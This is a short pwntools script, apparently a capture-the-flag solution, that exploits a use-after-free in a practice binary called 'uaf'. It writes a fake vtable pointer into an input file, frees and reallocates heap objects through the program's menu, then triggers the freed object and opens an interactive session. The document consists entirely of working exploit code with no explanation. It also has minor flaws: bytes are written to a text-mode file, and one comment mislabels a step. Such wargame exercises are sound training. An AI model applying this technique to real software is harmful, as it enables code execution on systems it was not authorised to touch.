import os
from pwn import *
os.system('rm /tmp/uaf_input')
f = open('/tmp/uaf_input', 'w')
f.write(p64(0x401570-8) + b'A'*16)
f.close()

p=process(['/home/uaf/uaf', '24', '/tmp/uaf_input'])


# delete both objs

p.recvuntil('free')
p.sendline('3')


# overwrite w

p.recvuntil('free')
p.sendline('2')


# overwrite w

p.recvuntil('free')
p.sendline('2')


# overwrite m

p.recvuntil('free')
p.sendline('1')



p.interactive()

